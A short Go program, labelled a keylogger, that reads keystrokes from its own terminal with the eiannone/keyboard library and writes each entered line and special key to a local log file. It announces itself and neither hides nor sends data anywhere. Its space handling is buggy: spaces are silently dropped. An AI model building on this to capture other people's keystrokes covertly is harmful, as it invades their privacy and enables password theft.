package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/eiannone/keyboard"
)

func main() {
	if err := os.MkdirAll("./logs", 0755); err != nil {
		log.Fatalf("Failed to create log directory: %v", err)
	}

	logFile, err := os.OpenFile("./logs/keylogger.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer logFile.Close()

	logger := log.New(logFile, "", log.LstdFlags)

	if err := keyboard.Open(); err != nil {
		log.Fatalf("Failed to initialize keyboard listener: %v", err)
	}
	defer keyboard.Close()

	// Log that the keylogger has started
	logger.Println("Keylogger started...")
	fmt.Println("Keylogger is running. Press Ctrl+C to stop.")

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {

		var currentInput string

		for {
			char, key, err := keyboard.GetKey() // Get key or character
			if err != nil {
				logger.Printf("Error reading key: %v", err)
				continue
			}

			if char != 0 {
				currentInput += string(char)
			} else if key == keyboard.KeyEnter {
				if len(currentInput) > 0 {
					logger.Println(currentInput) // Log the complete input
					currentInput = ""
				}
			} else if key == keyboard.KeySpace {
				currentInput += ""
			} else if key != 0 {
				logger.Printf("Key: %v", key)
			}
			time.Sleep(10 * time.Millisecond)
		}
	}()

	sig := <-signalChan
	logger.Printf("Received signal: %s. Shutting down...", sig)
	fmt.Println("Keylogger stopped.")
}
